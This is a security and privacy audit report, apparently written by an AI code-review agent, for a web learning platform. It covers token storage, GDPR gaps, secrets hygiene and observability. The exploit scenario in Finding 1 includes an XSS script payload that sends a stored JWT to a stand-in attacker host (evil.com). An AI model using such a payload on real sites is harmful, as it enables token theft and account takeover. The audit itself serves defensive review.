# AI Fluency Platform -- Privacy, Observability & Configuration Security Audit

**Auditor**: Code Reviewer Agent (Principal Architect + Security Engineer + Staff Backend Engineer)
**Date**: 2026-03-07
**Scope**: Privacy/GDPR compliance, observability infrastructure, configuration security
**Product**: ai-fluency
**Overall Assessment**: Fair (6.5/10 for audited domains)

---

## Executive Summary

The AI Fluency platform demonstrates solid foundational security practices -- Argon2id password hashing, PII redaction in logging, timing-safe token comparisons, RLS-based multi-tenancy, and structured error responses. However, the audit reveals several material gaps in GDPR compliance (no backend data deletion/export endpoints), a critical XSS vector from JWT storage in localStorage, missing `.env.bak` gitignore coverage, and incomplete config validation for OpenRouter credentials referenced at runtime. Observability infrastructure is functional but custom-built and not production-grade (no Sentry, no Prometheus exporter, in-memory metrics).

**Top 5 Risks:**

1. **[P0] JWT stored in localStorage** -- XSS vulnerability allowing token theft
2. **[P0] No backend GDPR endpoints** -- Right to erasure/export are UI-only placeholders
3. **[P1] `.env.bak` not in .gitignore** -- Backup env file could leak secrets if committed
4. **[P1] Slow query log leaks query params** -- Prisma query event includes `params` field containing PII
5. **[P1] No consent capture at registration** -- GDPR requires explicit consent before processing

---

## Privacy & GDPR Findings

### Finding 1: JWT Access Token Stored in localStorage (CRITICAL)

**Severity**: Critical | **Likelihood**: High | **CWE**: CWE-922 (Insecure Storage of Sensitive Information)

**File/Location**:
- `/products/ai-fluency/apps/web/src/lib/auth.ts:8` -- `localStorage.getItem(TOKEN_KEY)`
- `/products/ai-fluency/apps/web/src/lib/auth.ts:13` -- `localStorage.setItem(TOKEN_KEY, token)`
- `/products/ai-fluency/apps/web/src/lib/api.ts:2` -- comment confirms localStorage usage

**Description**: The JWT access token is stored in `localStorage`, which is accessible to any JavaScript running on the page. A single XSS vulnerability (reflected, stored, or DOM-based) allows an attacker to steal the token and impersonate the user. The product's own addendum explicitly states: "Never localStorage -- use in-memory TokenManager."

**Impact**: Full account takeover via token theft. The JWT contains `sub` (userId), `orgId`, and `role` -- sufficient to access all user data across the platform.

**Exploit Scenario**:
1. Attacker finds any XSS vector (e.g., a URL parameter reflected into the page)
2. Injects `<script>fetch('https://evil.com/?t='+localStorage.getItem('ai_fluency_token'))</script>`
3. Receives the JWT, replays it against `/api/v1/auth/me`, `/api/v1/dashboard`, `/api/v1/profile`
4. Token is valid for 24 hours (see `routes/auth.ts:135` -- `expiresIn: '24h'`)

**Fix**: Replace localStorage with an in-memory TokenManager class, as specified in the addendum. Use httpOnly cookies for refresh tokens (the `auth.service.ts` already has refresh token logic but it is not wired to the frontend).

```typescript
// BEFORE (vulnerable):
export function setToken(token: string): void {
  localStorage.setItem(TOKEN_KEY, token);
}

// AFTER (secure):
class TokenManager {
  private accessToken: string | null = null;
  setToken(token: string) { this.accessToken = token; }
  getToken() { return this.accessToken; }
  clearToken() { this.accessToken = null; }
}
export const tokenManager = new TokenManager();
```

---

### Finding 2: No Backend GDPR Data Deletion or Export Endpoints (HIGH)

**Severity**: High | **Likelihood**: High | **Blast Radius**: Organization-wide

**File/Location**:
- `/products/ai-fluency/apps/web/src/app/settings/privacy/page.tsx:74-83` -- Export button (UI only, no handler)
- `/products/ai-fluency/apps/web/src/app/settings/privacy/page.tsx:94-99` -- Delete button (UI only, no handler)
- `/products/ai-fluency/apps/api/src/routes/index.ts` -- No GDPR routes registered

**Description**: The frontend privacy settings page displays GDPR rights (Access, Rectification, Erasure, Portability) with "Export Your Data" and "Delete Account" buttons, but neither button has an `onClick` handler. More critically, there are **zero backend API endpoints** implementing:
- **Right to Erasure (GDPR Art. 17)**: No `DELETE /api/v1/auth/me` or `POST /api/v1/auth/delete-account`
- **Right to Data Portability (GDPR Art. 20)**: No `GET /api/v1/auth/export` or `POST /api/v1/auth/data-export`
- **Right of Access (GDPR Art. 15)**: No endpoint returning all PII held for a user

The Prisma schema has `deletedAt` fields for soft-delete (schema.prisma:278), and the schema comment at line 254 says "background worker hard-deletes after dataRetentionDays" -- but no such worker exists in the codebase.

**Impact**: GDPR non-compliance. Under GDPR, data subjects can request erasure within 30 days. Without these endpoints, the platform cannot comply with data subject access requests (DSARs). Fines can reach 4% of annual revenue.

**Fix**: Implement these API endpoints:

```
DELETE /api/v1/auth/me          -- Soft-delete user (set deletedAt)
GET    /api/v1/auth/export      -- Export all user PII as JSON
POST   /api/v1/auth/consent     -- Record/withdraw consent
```

Also implement the background worker referenced in the schema comment to hard-delete after `dataRetentionDays`.

---

### Finding 3: No Consent Capture at Registration (HIGH)

**Severity**: High | **Likelihood**: High | **CWE**: CWE-359 (Exposure of Private Personal Information)

**File/Location**:
- `/products/ai-fluency/apps/web/src/app/register/page.tsx` -- No consent checkbox
- `/products/ai-fluency/apps/api/src/routes/auth.ts:19-32` -- `registerSchema` has no consent field
- `/products/ai-fluency/apps/api/prisma/schema.prisma` -- No consent columns on User model

**Description**: GDPR Article 6 requires a lawful basis for processing personal data. The registration form collects name, email, and password but does not capture explicit consent (checkbox, timestamp, version). There is no `consentGiven`, `consentAt`, or `privacyPolicyVersion` field in the User model.

**Impact**: Without documented consent, the platform has no lawful basis for processing user data. This is a fundamental GDPR compliance gap.

**Fix**: Add to registration:
- Frontend: Mandatory checkbox "I agree to the Privacy Policy and Terms of Service"
- Backend: `consentAt DateTime?`, `consentVersion String?` columns on User model
- API: Include `consentGiven: true` in register request, reject if false

---

### Finding 4: PII Columns in Schema Without Encryption-at-Rest (MEDIUM)

**Severity**: Medium | **Likelihood**: Medium

**File/Location**:
- `/products/ai-fluency/apps/api/prisma/schema.prisma:260` -- `email String @db.VarChar(255)`
- `/products/ai-fluency/apps/api/prisma/schema.prisma:261` -- `firstName String @db.VarChar(100)`
- `/products/ai-fluency/apps/api/prisma/schema.prisma:262` -- `lastName String @db.VarChar(100)`
- `/products/ai-fluency/apps/api/prisma/schema.prisma:307` -- `ipAddress String? @db.VarChar(45)` (UserSession)
- `/products/ai-fluency/apps/api/prisma/schema.prisma:580` -- `ipAddress String? @db.VarChar(45)` (AuditLog)

**Description**: PII fields (email, firstName, lastName, ipAddress) are stored as plaintext in PostgreSQL. While the SSO config field uses AES-256-GCM encryption (schema.prisma:330), user PII does not. The addendum specifies "encryption at rest" but this relies on database-level TDE which is not configured in the docker-compose.

**Impact**: If the database is compromised, all user PII is immediately readable. GDPR recommends pseudonymization or encryption of personal data.

**Recommendation**: Enable PostgreSQL TDE in production, or implement application-layer encryption for email and name fields.

---

### Finding 5: Password Hashing -- Correctly Implemented (POSITIVE)

**File/Location**:
- `/products/ai-fluency/apps/api/src/routes/auth.ts:14` -- `import { hash as argon2Hash, verify as argon2Verify } from 'argon2'`
- `/products/ai-fluency/apps/api/src/routes/auth.ts:42-47` -- Argon2id with memoryCost=65536, timeCost=3
- `/products/ai-fluency/apps/api/src/services/auth.service.ts:19-25` -- Same OWASP-recommended parameters

**Assessment**: Passwords are correctly hashed with Argon2id using OWASP-recommended parameters. Tokens are hashed with SHA-256 before storage. Timing-safe comparisons are used throughout (`crypto.ts`, `observability.ts`). This is well-implemented.

---

### Finding 6: PII Redaction in Logger -- Mostly Good, One Gap (MEDIUM)

**File/Location**:
- `/products/ai-fluency/apps/api/src/utils/logger.ts:17-35` -- SENSITIVE_SUBSTRINGS list
- `/products/ai-fluency/apps/api/src/utils/logger.ts:34` -- `'email'` is in the redaction list

**Assessment**: The logger correctly redacts fields containing `password`, `secret`, `token`, `email`, `ip`, `cookie`, etc. However:

**Gap**: The `firstName` and `lastName` fields are NOT in the redaction list. If any code path logs user objects containing these fields, they will appear in plaintext in logs. Currently no code path does this explicitly, but it is a defense-in-depth gap.

**Fix**: Add `'firstname'`, `'lastname'`, `'name'` to SENSITIVE_SUBSTRINGS.

---

## Secrets & Configuration Findings

### Finding 7: `.env.bak` Not Gitignored (HIGH)

**Severity**: High | **Likelihood**: Medium

**File/Location**:
- `/products/ai-fluency/apps/api/.gitignore` -- Lists `.env`, `.env.test`, `.env.local`, `.env.*.local`, `.env.production` but NOT `.env.bak`
- `/products/ai-fluency/apps/api/.env.bak` -- Exists on disk, contains JWT secrets and DB credentials

**Description**: The `.env.bak` file contains the same secrets as `.env.test` (JWT secrets, SSO encryption key, internal API key). While it is not currently tracked by git, the `.gitignore` does not explicitly exclude `.env.bak`. Any developer running `git add apps/api/` could accidentally commit it.

**Fix**: Add `.env.bak` (or `*.bak`) to `.gitignore`:
```
.env.bak
*.bak
```

---

### Finding 8: OpenRouter Config Referenced But Not Validated (MEDIUM)

**Severity**: Medium | **Likelihood**: Medium

**File/Location**:
- `/products/ai-fluency/apps/api/src/services/assessment.service.ts:21-27` -- References `config.OPENROUTER_API_KEY`, `config.OPENROUTER_MODEL`, `config.OPENROUTER_BASE_URL`, `config.OPENROUTER_MAX_TOKENS`, `config.OPENROUTER_TEMPERATURE`
- `/products/ai-fluency/apps/api/src/config.ts` -- These five OPENROUTER_* fields are NOT present in the Zod schema

**Description**: The `AssessmentService` accesses `config.OPENROUTER_API_KEY` and four other OPENROUTER fields, but the `config.ts` Zod schema does not define them. This means TypeScript will flag `config.OPENROUTER_API_KEY` as a type error at compile time (assuming strict types). At runtime with `as any` casting, it would read `undefined` from `process.env`.

**Impact**: Either compilation fails (blocking deployment) or the AI feedback feature silently degrades. The config file should declare these as optional fields.

**Fix**: Add to the Zod schema in `config.ts`:
```typescript
OPENROUTER_API_KEY: z.string().optional(),
OPENROUTER_MODEL: z.string().default('meta-llama/llama-3-8b-instruct'),
OPENROUTER_BASE_URL: z.string().url().default('https://openrouter.ai/api/v1'),
OPENROUTER_MAX_TOKENS: z.coerce.number().int().positive().default(1024),
OPENROUTER_TEMPERATURE: z.coerce.number().min(0).max(2).default(0.3),
```

---

### Finding 9: JWT Expiry Mismatch Between Route and Service (MEDIUM)

**Severity**: Medium | **Likelihood**: High

**File/Location**:
- `/products/ai-fluency/apps/api/src/routes/auth.ts:135` -- `expiresIn: '24h'`
- `/products/ai-fluency/apps/api/src/routes/auth.ts:209` -- `expiresIn: '24h'`
- `/products/ai-fluency/apps/api/src/services/auth.service.ts:27` -- `ACCESS_TOKEN_EXPIRY = '15m'`
- `/products/ai-fluency/apps/api/src/config.ts:25` -- `JWT_ACCESS_EXPIRY` default = 900 (15 minutes)

**Description**: Two separate auth implementations exist. The `routes/auth.ts` file issues JWTs with 24-hour expiry, while the `services/auth.service.ts` uses 15-minute access tokens with refresh token rotation. The config default is 15 minutes. The 24-hour expiry in routes/auth.ts is a security risk -- access tokens should be short-lived (15 minutes as designed in the service).

**Impact**: If `routes/auth.ts` is the active code path, tokens are valid for 24 hours instead of 15 minutes. Combined with localStorage storage (Finding 1), a stolen token remains valid for an entire day.

**Fix**: Remove the hardcoded `'24h'` from `routes/auth.ts` and use `config.JWT_ACCESS_EXPIRY` or delegate to `auth.service.ts`.

---

### Finding 10: Slow Query Log May Leak PII via Prisma Params (MEDIUM)

**Severity**: Medium | **Likelihood**: Medium | **CWE**: CWE-532 (Insertion of Sensitive Information into Log File)

**File/Location**:
- `/products/ai-fluency/apps/api/src/plugins/prisma.ts:39-47`

**Description**: The Prisma query event listener logs slow queries including the `e.query` field. While the logger's PII redaction applies to field names, the raw SQL query string may contain interpolated email addresses, names, or other PII as string literals (e.g., `WHERE email = 'user@example.com'`). The event also captures `e.params` (declared in the type signature at line 39) but does not currently log it -- however, the `e.query` field itself contains parameterized values in Prisma's format.

**Fix**: Truncate or redact the query string before logging, or log only the query template without parameter values:
```typescript
logger.warn('Slow query detected', {
  query: e.query.substring(0, 200), // truncate
  duration_ms: e.duration,
});
```

---

## Observability Findings

### Finding 11: Custom In-Memory Metrics -- Not Production-Grade (MEDIUM)

**File/Location**:
- `/products/ai-fluency/apps/api/src/plugins/observability.ts:19-30` -- In-memory metrics object
- `/products/ai-fluency/apps/api/src/plugins/observability.ts:42-44` -- Samples array grows unbounded (capped at 1000)

**Description**: The metrics system uses an in-memory JavaScript object that resets on every server restart. This means:
- No historical metrics survive restarts
- No multi-instance metrics aggregation (horizontal scaling loses data)
- No Prometheus-compatible `/metrics` endpoint (the current one returns JSON, not Prometheus text format)
- No Grafana/alerting integration possible

**Positive**: The implementation does include p50/p95/p99 latency tracking, request counting by status code, and periodic log flushes (line 145).

**Recommendation**: Replace with `prom-client` (Prometheus client) for production. This enables Grafana dashboards, alerting, and survives restarts via pull-based scraping.

---

### Finding 12: No Error Tracking Service (Sentry/Datadog) (MEDIUM)

**File/Location**: No references to Sentry, Datadog, Bugsnag, or any APM in the codebase.

**Description**: The platform has no external error tracking. Errors are logged to stdout via the custom logger, but there is no alerting, error grouping, or stack trace aggregation. The `.env.example` mentions `SENTRY_DSN` as a commented-out optional variable but it is never used in code.

**Impact**: In production, errors will be invisible unless someone actively monitors log streams. No alerts on error rate spikes, no error grouping, no release tracking.

**Recommendation**: Install `@sentry/node` for the API and `@sentry/nextjs` for the web app. Wire into the global error handler at `app.ts:113`.

---

### Finding 13: Correlation IDs -- Correctly Implemented (POSITIVE)

**File/Location**:
- `/products/ai-fluency/apps/api/src/app.ts:52-53` -- `requestIdHeader: 'x-request-id'`, `requestIdLogLabel: 'request_id'`
- `/products/ai-fluency/apps/api/src/plugins/observability.ts:69` -- `request_id: req.id` in onRequest hook
- `/products/ai-fluency/apps/api/src/plugins/observability.ts:84` -- `request_id: request.id` in onResponse hook
- `/products/ai-fluency/apps/api/src/utils/errors.ts:39` -- `instance` field carries request ID in RFC 7807 errors

**Assessment**: Correlation IDs are properly propagated from request through to log entries and error responses. The `x-request-id` header is respected if provided by the client/load balancer, and auto-generated otherwise. This is well-implemented.

---

### Finding 14: Health Check Endpoints -- Correctly Implemented (POSITIVE)

**File/Location**:
- `/products/ai-fluency/apps/api/src/routes/health.ts:22` -- `GET /health` (DB + Redis check)
- `/products/ai-fluency/apps/api/src/routes/health.ts:88` -- `GET /ready` (lightweight DB-only)

**Assessment**: Both liveness (`/health`) and readiness (`/ready`) probes exist. The health check correctly returns 503 when the database is unreachable. Redis failures degrade gracefully. Docker-compose healthcheck at `docker-compose.yml:72` uses `/health`. This is production-ready.

---

## API Design Findings

### Finding 15: No OpenAPI/Swagger Documentation (MEDIUM)

**File/Location**: No `@fastify/swagger` or `@fastify/swagger-ui` in any package.json or source file.

**Description**: The API has no auto-generated documentation. While an `api-schema.yml` file exists in docs, there is no runtime Swagger UI. For a platform with 15+ endpoints, this makes API discovery and testing difficult.

**Recommendation**: Register `@fastify/swagger` + `@fastify/swagger-ui` in `app.ts` to auto-generate docs from route schemas.

---

### Finding 16: Duplicate Route Registration (assessments.ts vs assessment.ts) (MEDIUM)

**File/Location**:
- `/products/ai-fluency/apps/api/src/routes/assessment.ts` -- Full assessment lifecycle (start, respond, complete, results)
- `/products/ai-fluency/apps/api/src/routes/assessments.ts` -- Overlapping routes (create, responses, complete, results)
- `/products/ai-fluency/apps/api/src/routes/index.ts` -- Only `assessment.ts` is registered (line 12)

**Description**: Two route files define nearly identical assessment endpoints. `assessments.ts` uses the `AssessmentService` class pattern while `assessment.ts` has inline logic. Only `assessment.ts` is registered in `routes/index.ts`. The `assessments.ts` file is dead code but could cause confusion.

Similarly, `profile.ts` and `profiles.ts` both export `profileRoutes` -- only `profile.ts` is registered.

**Fix**: Delete `assessments.ts` and `profiles.ts` (dead code), or consolidate the implementations.

---

### Finding 17: Profile History Endpoint Missing Pagination (in profile.ts) (LOW)

**File/Location**:
- `/products/ai-fluency/apps/api/src/routes/profile.ts:72` -- `GET /history` uses `findMany` without `take`/`skip`
- `/products/ai-fluency/apps/api/src/routes/profiles.ts:50-52` -- Has pagination (but is dead code)

**Description**: The active `profile.ts` history endpoint returns all profiles without pagination. For users with many assessments, this could return large payloads. The dead `profiles.ts` file has proper pagination.

**Fix**: Add `page`/`limit` query parameters to `profile.ts:GET /history`, matching the pattern in `profiles.ts`.

---

### Finding 18: CORS -- Properly Configured (POSITIVE)

**File/Location**:
- `/products/ai-fluency/apps/api/src/app.ts:57-80` -- Origin whitelist, credentials enabled, production requires origin

**Assessment**: CORS is properly configured with an explicit allowlist. In production, requests without an origin header are rejected. The `credentials: true` flag is set, enabling httpOnly cookies for future refresh token support.

---

### Finding 19: Rate Limiting -- Properly Configured (POSITIVE)

**File/Location**:
- `/products/ai-fluency/apps/api/src/plugins/rate-limit.ts:19-51` -- Redis-backed, user-keyed for auth, IP-keyed for unauth
- Health/ready/metrics endpoints exempted

**Assessment**: Rate limiting is well-implemented with Redis backing, proper key generation (userId for authenticated, IP for unauthenticated), and RFC 7807 error responses.

---

### Finding 20: Request Validation -- Consistent Zod Usage (POSITIVE)

**File/Location**: All route files use Zod for request body validation.

**Assessment**: Every POST/PATCH endpoint validates input with Zod schemas. UUID parameters are validated. Error messages are specific but do not leak internal details. This is well-implemented.

---

## Docker & Infrastructure Findings

### Finding 21: Docker Compose Default PostgreSQL Password (LOW)

**File/Location**:
- `/products/ai-fluency/docker-compose.yml:20` -- `POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-postgres}`

**Description**: The default PostgreSQL password is `postgres`. While this is for local development only (comment at line 23 says "DEV ONLY -- not exposed in production"), the `.env.example` at the product root shows `postgres_change_in_production` as the default password, which is slightly better but still weak.

**Recommendation**: Add a comment or startup check that warns if the default password is used in production.

---

## Risk Matrix -- Top 10 Critical Issues

| # | Issue | Severity | Likelihood | Blast Radius | Risk Score |
|---|-------|----------|-----------|--------------|------------|
| 1 | JWT in localStorage (XSS vector) | Critical | High | Product-wide | **P0** |
| 2 | No GDPR deletion/export endpoints | High | High | Organization-wide | **P0** |
| 3 | No consent capture at registration | High | High | Organization-wide | **P1** |
| 4 | .env.bak not gitignored | High | Medium | Organization-wide | **P1** |
| 5 | JWT 24h expiry (should be 15m) | Medium | High | Product-wide | **P1** |
| 6 | OpenRouter config not in Zod schema | Medium | Medium | Feature-specific | **P2** |
| 7 | Slow query log may leak PII | Medium | Medium | Feature-specific | **P2** |
| 8 | No Sentry/APM integration | Medium | Medium | Product-wide | **P2** |
| 9 | In-memory metrics (not persistent) | Medium | Low | Product-wide | **P2** |
| 10 | firstName/lastName not redacted | Low | Low | Feature-specific | **P3** |

---

## Remediation Roadmap

### 30-Day Plan (Critical Fixes)
1. **Replace localStorage with in-memory TokenManager** -- 2 days
2. **Implement `DELETE /api/v1/auth/me` and `GET /api/v1/auth/export`** -- 3 days
3. **Add consent capture to registration** -- 1 day
4. **Add `.env.bak` to .gitignore** -- 5 minutes
5. **Fix JWT expiry to use config (15 min)** -- 30 minutes

### 60-Day Plan (Important Improvements)
1. **Add OpenRouter fields to Zod config schema** -- 1 hour
2. **Add firstName/lastName to logger redaction** -- 15 minutes
3. **Truncate slow query log to prevent PII leak** -- 30 minutes
4. **Integrate Sentry for error tracking** -- 1 day
5. **Delete dead code (assessments.ts, profiles.ts)** -- 30 minutes
6. **Add pagination to profile history** -- 1 hour

### 90-Day Plan (Strategic Improvements)
1. **Replace in-memory metrics with prom-client** -- 2 days
2. **Add @fastify/swagger for API documentation** -- 1 day
3. **Implement GDPR data retention background worker** -- 3 days
4. **Enable PostgreSQL TDE or app-layer PII encryption** -- 3 days

---

## Quick Wins (< 1 Day Each)

1. Add `.env.bak` to `.gitignore` (5 min)
2. Fix JWT expiry from `'24h'` to `config.JWT_ACCESS_EXPIRY` in `routes/auth.ts:135,209` (30 min)
3. Add `'firstname'`, `'lastname'`, `'name'` to logger SENSITIVE_SUBSTRINGS (15 min)
4. Add OpenRouter optional fields to Zod schema in `config.ts` (1 hour)
5. Delete dead code files `assessments.ts` and `profiles.ts` (30 min)
6. Truncate `e.query` in slow query log to 200 chars (15 min)
7. Add consent checkbox to registration form (2 hours)
